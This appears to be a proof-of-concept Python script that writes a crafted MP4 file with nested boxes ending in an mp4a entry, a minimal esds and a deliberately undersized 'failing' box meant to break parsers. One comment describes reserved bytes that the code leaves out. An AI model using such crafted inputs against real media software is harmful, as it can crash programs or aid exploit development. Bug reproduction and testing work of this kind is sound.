import struct

def box(typ, payload):
    return struct.pack('>I4s', 8+len(payload), typ) + payload

def make_mp4a():
    # mp4a audio sample entry: 8 bytes header + 28 bytes sample entry fields
    # sample entry: 6 reserved + 2 data_ref_index
    # audio sample entry: 8 (reserved) + 2 (channelcount) + 2 (samplesize) + 4 (pre_defined) + 4 (reserved) + 4 (samplerate)
    sample_entry = b'\x00'*6 + struct.pack('>H', 1)  # reserved + data_ref_index
    audio_entry = struct.pack('>H', 2) + struct.pack('>H', 16) + struct.pack('>I', 0) + struct.pack('>I', 0) + struct.pack('>I', 44100<<16)
    # wave box containing esds
    esds_payload = b'\x00'*4 + b'\x03\x19\x00\x00' + b'\x00'*4  # minimal esds
    esds = box(b'esds', esds_payload)
    wave = box(b'wave', esds)
    # a failing box: size=5 < 8 -> parse error
    failing = struct.pack('>I4s', 5, b'xxxx')
    return box(b'mp4a', sample_entry + audio_entry + wave + failing)

def make_stsd():
    # stsd: fullbox (4 bytes version/flags) + entry_count (4 bytes) + sample entries
    entries = make_mp4a()
    return box(b'stsd', b'\x00\x00\x00\x00' + struct.pack('>I', 1) + entries)

def make_stbl():
    return box(b'stbl', make_stsd())

def make_minf():
    return box(b'minf', make_stbl())

def make_mdia():
    return box(b'mdia', make_minf())

def make_trak():
    return box(b'trak', make_mdia())

def make_moov():
    return box(b'moov', make_trak())

def make_ftyp():
    return box(b'ftyp', b'isom' + struct.pack('>I', 0) + b'isomiso2')

def make_file():
    return make_ftyp() + make_moov()

data = make_file()
with open('/tmp/poc.mp4', 'wb') as f:
    f.write(data)
print("wrote", len(data), "bytes")
